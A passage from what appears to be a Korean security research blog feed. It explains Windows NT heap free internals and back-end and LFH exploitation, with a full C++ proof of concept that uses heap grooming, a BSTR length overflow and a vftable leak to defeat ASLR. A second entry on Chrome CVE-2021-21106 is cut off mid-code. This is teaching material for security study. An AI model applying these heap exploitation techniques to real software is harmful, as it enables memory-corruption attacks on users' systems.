Heap"></a>Free in NT Heap</h1><p>Free 할 때는 chunk 크기에 따라 두 가지로 나뉩니다.</p><ul><li>Size ≤ 0xff000</li><li>Size &gt; 0xff000</li></ul><h2 id="Size-≤-0xff000"><a href="#Size-≤-0xff000" class="headerlink" title="Size ≤ 0xff000"></a>Size ≤ 0xff000</h2><p>먼저 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY">_HEAP_ENTRY-&gt;UnusedBytes</a> 에서 해당 chunk가 LFH로 관리되고 있는지 확인합니다.</p><h3 id="LFH-Disabled-1"><a href="#LFH-Disabled-1" class="headerlink" title="LFH Disabled"></a>LFH Disabled</h3><ol><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY">_HEAP-&gt;FrontEndHeapUsageData</a> 값을 1 감소시킵니다.</li><li>이전 혹은 다음 chunk가 free 된 상태면 free 할 해당 chunk와 병합합니다.</li><li>병합한 chunk를 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">_HEAP_ENTRY-&gt;FreeList</a>의 시작 혹은 끝에 삽입할 수 있는지 확인합니다.</li><li>삽입 가능하면 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">_HEAP_ENTRY-&gt;FreeList</a>에, 아니라면 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP">_HEAP_LIST_LOOKUP-&gt;ListHint</a>에 chunk를 삽입합니다.</li></ol><h3 id="LFH-Enabled-1"><a href="#LFH-Enabled-1" class="headerlink" title="LFH Enabled"></a>LFH Enabled</h3><ol><li>header를 디코딩해 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER</a> 와 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_SUBSEGMENT</a> 를 구합니다.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_ENTRY-&gt;UnusedBytes</a> 값을 <code>0x80</code>으로 수정합니다.<ul><li><code>UnusedBytes</code>가 <code>0x80</code>이면 해제된 LFH chunk로 인식합니다.</li></ul></li><li>chunk의 인덱스를 찾아 메모리 할당 비트맵인 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER-&gt;BusyBitmap</a>에 해제할 chunk에 해당하는 bit를 0으로 수정합니다.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT">_HEAP_SUBSEGMENT-&gt;AggregateExchg</a> 의 depth를 1 증가시킵니다.</li><li>만약 해제된 chunk가 <code>ActiveSubsegment</code> 에 속하지 않은 경우 <code>CachedItem</code> 에 넣습니다.</li></ol><h2 id="Size-gt-0xff000-1"><a href="#Size-gt-0xff000-1" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h2><ol><li>해제할 chunk를 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP">_HEAP-&gt;VirtualAllocdBlocks</a> 에서 제거합니다.</li><li><code>RtlSecMemFreeVirtualMemory</code> 함수를 사용해 할당 해제합니다.</li></ol><p>복잡한 것처럼 보이지만, 사용하는 구조체 필드 설명을 보면서 이해하면 <del>그래도 복잡하지만</del> Heap 메모리를 어떻게 관리하는지 보입니다!</p><h1 id="NT-Heap-Exploitation"><a href="#NT-Heap-Exploitation" class="headerlink" title="NT Heap Exploitation"></a>NT Heap Exploitation</h1><p>일반적인 Back-End exploitation과 LFH인 Front-End exploitation 두 가지로 나뉩니다. </p><h3 id="Back-End-Exploitation"><a href="#Back-End-Exploitation" class="headerlink" title="Back-End Exploitation"></a>Back-End Exploitation</h3><p>LFH는 <code>0x4000</code> 이하 크기의 chunk가 18개 할당될 때부터 활성화된다는 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#Low-Fragmentation-Heap">내용</a>이 part 2에서 나왔었죠? Back-End에서 취약점을 트리거하려면 LFH가 비활성화된 상태여야 하므로 chunk 할당을 18개 미만으로 제한해야 합니다. 보통 첫 번째(index 0)와 두 번째(index 1) 할당에도 chunk 간 거리가 크기 때문에 적합하지 않으니 우리가 접근하기 좋은 chunk의 index는 2 ~ 16 까지겠네요. 그 이후에는 일반적인 heap overflow로 chunk를 정렬하고 필요한 주소를 leak 하는 방법과 동일합니다.</p><p>예제코드로 확인해볼게요.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;comdef.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNK_SIZE 0x190</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALLOC_COUNT 10</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SomeObject</span> &#123;</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">function1</span><span class="hljs-params">()</span> </span>&#123;&#125;;    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">virtual_function1</span><span class="hljs-params">()</span> </span>&#123;&#125;;&#125;;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> args, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">int</span> i;    BSTR bstr;    HANDLE hChunk;    <span class="hljs-keyword">void</span>* allocations[ALLOC_COUNT];    BSTR bStrings[<span class="hljs-number">5</span>];    SomeObject* object = <span class="hljs-keyword">new</span> SomeObject();    HANDLE defaultHeap = GetProcessHeap();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Default heap = 0x%08x\n&quot;</span>, defaultHeap);    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ALLOC_COUNT; i++) &#123;        hChunk = HeapAlloc(defaultHeap, <span class="hljs-number">0</span>, CHUNK_SIZE);        <span class="hljs-built_in">memset</span>(hChunk, <span class="hljs-string">&#x27;A&#x27;</span>, CHUNK_SIZE);        allocations[i] = hChunk;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Heap chunk in backend : 0x%08x\n&quot;</span>, i, hChunk);    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing allocation at index 3: 0x%08x\n&quot;</span>, allocations[<span class="hljs-number">3</span>]);    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[<span class="hljs-number">3</span>]);       <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;        bstr = SysAllocString(<span class="hljs-string">L&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);        bStrings[i] = bstr;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] BSTR string : 0x%08x\n&quot;</span>, i, bstr);    &#125;    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing allocation at index 4: 0x%08x\n&quot;</span>, allocations[<span class="hljs-number">4</span>]);    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[<span class="hljs-number">4</span>]);    <span class="hljs-keyword">int</span> objRef = (<span class="hljs-keyword">int</span>)object;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject address for Chunk 3 : 0x%08x\n&quot;</span>, objRef);    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array1</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array2</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array3</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array4</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array5</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array6</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array7</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array8</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array9</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array10</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array1);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array2);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array3);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array4);           system(<span class="hljs-string">&quot;PAUSE&quot;</span>);     UINT strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overflowing allocation 2\n&quot;</span>);    <span class="hljs-keyword">char</span> evilString[] =        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;CCCCDDDD&quot;</span>        <span class="hljs-string">&quot;\xff\x00\x00\x00&quot;</span>;    <span class="hljs-built_in">memcpy</span>(allocations[<span class="hljs-number">2</span>], evilString, <span class="hljs-keyword">sizeof</span>(evilString));    strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Modified String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> <span class="hljs-title">ws</span><span class="hljs-params">(bStrings[<span class="hljs-number">0</span>], strSize)</span></span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> ref = ws.substr(<span class="hljs-number">120</span> + <span class="hljs-number">16</span>, <span class="hljs-number">4</span>);    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];    <span class="hljs-built_in">memcpy</span>(buf, ref.data(), <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> refAddr = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));    <span class="hljs-built_in">memcpy</span>(buf, (<span class="hljs-keyword">void</span>*)refAddr, <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> vftable = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found vftable address : 0x%08x\n&quot;</span>, vftable);    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><ol><li>index 0~9까지 chunk 10개를 할당합니다. </li><li>chunk[3]를 해제한 뒤 BSTR string을 할당합니다.<ul><li>BSTR : <code>Header + String + NULL terminator</code> 형식의 자료형으로 각 문자는 2 bytes 크기를 가지며 헤더에 객체의 size가 저장됨</li></ul></li><li>chunk[4]를 해제한 뒤 virtual function table pointer가 있는 <code>SomeObject</code> 객체 포인터 배열을 할당합니다.</li></ol><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%202.png" alt="pwncoolsexy-part3/Untitled%202.png"></p><pre><code class="hljs cpp">| CHUNK[<span class="hljs-number">0</span>] | CHUNK[<span class="hljs-number">1</span>] | CHUNK [<span class="hljs-number">2</span>] | BSTR [<span class="hljs-number">0</span>] | SomeObejct | CHUNK[<span class="hljs-number">5</span>] | ...</code></pre><p>실행결과에서 해제한 chunk[3]에 BSTR[0] 이, chunk[4]에는 SomeObject 포인터 배열이 할당된 것을 확인할 수 있습니다. </p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%203.png" alt="pwncoolsexy-part3/Untitled%203.png"></p><p>메모리 덤프에서 봐도 예쁘게 잘 정렬됐네요~</p><p>heap overflow를 이용해 chunk[2]에서 BSTR 헤더의 length 필드의 값을 <code>F8</code> → <code>FF</code> 로 수정하면 다음 chunk의 데이터를 읽을 수 있습니다.</p><pre><code class="hljs cpp">... UINT strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overflowing allocation 2\n&quot;</span>);<span class="hljs-keyword">char</span> evilString[] =        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;CCCCDDDD&quot;</span>        <span class="hljs-string">&quot;\xff\x00\x00\x00&quot;</span>;<span class="hljs-built_in">memcpy</span>(allocations[<span class="hljs-number">2</span>], evilString, <span class="hljs-keyword">sizeof</span>(evilString));strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Modified String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);...</code></pre><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%204.png" alt="pwncoolsexy-part3/Untitled%204.png"></p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%205.png" alt="pwncoolsexy-part3/Untitled%205.png"></p><p>이제 vftable 주소를 읽는 것만 남았습니다.</p><pre><code class="hljs cpp">...<span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> <span class="hljs-title">ws</span><span class="hljs-params">(bStrings[<span class="hljs-number">0</span>], strSize)</span></span>;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> ref = ws.substr(<span class="hljs-number">120</span> + <span class="hljs-number">16</span>, <span class="hljs-number">4</span>);<span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<span class="hljs-built_in">memcpy</span>(buf, ref.data(), <span class="hljs-number">4</span>);<span class="hljs-keyword">int</span> refAddr = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));<span class="hljs-built_in">memcpy</span>(buf, (<span class="hljs-keyword">void</span>*)refAddr, <span class="hljs-number">4</span>);<span class="hljs-keyword">int</span> vftable = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found vftable address : 0x%08x\n&quot;</span>, vftable);...</code></pre><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%206.png" alt="pwncoolsexy-part3/Untitled%206.png"></p><p>vftable 주소의 offset은 고정이므로 offset을 구해두면 이후에 imagebase가 바뀌어도 vftable을 leak 한 뒤 offset을 빼 imagebase를 쉽게 구할 수 있습니다.</p><pre><code class="hljs cpp">Executable search path is: ModLoad: <span class="hljs-number">002f</span>0000 <span class="hljs-number">002f</span>9000   C:\Users\dw0rdptr\source\repos\LFH\Release\LFH.exeModLoad: <span class="hljs-number">77210000</span> <span class="hljs-number">773b</span>2000   C:\WINDOWS\SYSTEM32\ntdll.dllModLoad: <span class="hljs-number">75</span>a80000 <span class="hljs-number">75b</span>70000   C:\WINDOWS\System32\KERNEL32.DLL</code></pre><p>현재 imagebase 가 <code>0x2f0000</code>이니까 offset은 <code>0x2f4690 - 0x2f0000 = 0x4690</code> 가 됩니다. </p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%207.png" alt="pwncoolsexy-part3/Untitled%207.png"></p><p>제대로 구했네요! 이렇게 LFH가 활성화되지 않은 Heap은 chunk를 재활용하는 프로세스를 쉽게 이용할 수 있습니다.</p><h2 id="Front-End-Exploitation"><a href="#Front-End-Exploitation" class="headerlink" title="Front-End Exploitation"></a>Front-End Exploitation</h2><p>LFH는 다음 할당되는 chunk의 위치를 예측할 수 없도록 랜덤으로 할당해 heap overflow나 UAF 등의 취약점이 발생해도 heap을 제어하기 어렵도록 설계되었습니다.</p><p>그럼 LFH에서의 exploitation 목표는 <code>해제 후 재 할당되는 chunk의 위치를 예측 가능하게 하는 것</code> 이 되겠네요. </p><p>A 객체를 해제하고 같은 크기의 B로 재 할당하는 UAF 시나리오를 가정해보겠습니다.</p><ul><li>A를 할당합니다.</li><li>A와 같은 크기의 B를 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT">UserBlock</a>을 모두 채울때까지 할당합니다.</li></ul><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%208.png" alt="pwncoolsexy-part3/Untitled%208.png"></p><ul><li>A를 해제한 이후 B를 할당하면 <code>UserBlock</code>에는 해제한 A 공간밖에 남아있지 않아 해제된 A chunk에 할당하게 되고 UAF를 트리거할 수 있습니다.</li></ul><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%209.png" alt="pwncoolsexy-part3/Untitled%209.png"></p><p>다음 글에서는 HITCON CTF 2019 QUAL에서 출제된 문제인 dadadb를 풀어보면서 LFH의 reuse attack 이슈에 대해 자세히 알아보겠습니다! </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U">https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U</a></p><p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21106: Double free/UAF Issue in Google Chrome</title>
    <link href="/2021/03/27/fabu1ous/2021-03-27/"/>
    <url>/2021/03/27/fabu1ous/2021-03-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1148749">Issue 1148749: Double free/UAF in RegionDataLoaderImpl::DeleteThis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 87.0.4280.141 </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Google Chrome 87.0.4280.141 이전 버전에서 발생하는 Use after free 취약점(CVE-2021-21106)입니다. 해커는 악성 HTML 페이지를 사용해 Chrome의 renderer process에 접근 및 취약점을 트리거할 수 있고 원격 코드 실행을 통한 sandbox escape를 할 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-number">46</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegionDataLoaderImpl::OnRegionDataLoaded</span><span class="hljs-params">(<span class="hljs-keyword">bool</span> success,</span></span><span class="hljs-function"><span class="hljs-params"> <span class="hljs-number">47</span>                                               <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; country_code,</span></span><span class="hljs-function"><span class="hljs-params"> <span class="hljs-number">48</span>                                               <span class="hljs-keyword">int</span> unused_rule_count)</span> </span>&#123; <span class="hljs-number">49</span>   timer_.Stop(); <span class="hljs-number">50</span>   <span class="hljs-keyword">if</span> (!callback_.is_null()) &#123; <span class="hljs-number">51</span>     <span class="hljs-keyword">if</span> (success) &#123; <span class="hljs-number">52</span>       <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> best_region_tree_language_tag; <span class="hljs-number">53</span>       ::i18n::<span class="hljs-function">addressinput::RegionDataBuilder <span class="hljs-title">builder</span><span class="hljs-params">(&amp;region_data_supplier_)</span></span>; <span class="hljs-number">54</span>       callback_.Run( <span class="hljs-number">55</span>           builder <span class="hljs-number">56</span>               .Build(country_code, app_locale_, &amp;best_region_tree_language_tag) <span class="hljs-number">57</span>               .sub_regions()); <span class="hljs-number">58</span>     &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-number">59</span>       callback_.Run(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">const</span> ::i18n::addressinput::RegionData*&gt;()); <span class="hljs-number">60</span>     &#125; <span class="hljs-number">61</span>   &#125; <span class="hljs-number">62</span>   <span class="hljs-comment">// The deletion must be asynchronous since the caller is not quite done with</span> <span class="hljs-number">63</span>   <span class="hljs-comment">// the preload supplier.</span> <span class="hljs-number">64</span>   base::ThreadTaskRunnerHandle::Get()-&gt;PostTask( <span class="hljs-number">65</span>       FROM_HERE, base::BindOnce(&amp;RegionDataLoaderImpl::DeleteThis, <span class="hljs-number">66</span>                                 base::Unretained(<span class="hljs-keyword">this</span>))); <span class="hljs-number">67</span> &#125; <span class="hljs-number">68</span>  <span class="hljs-number">69</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span 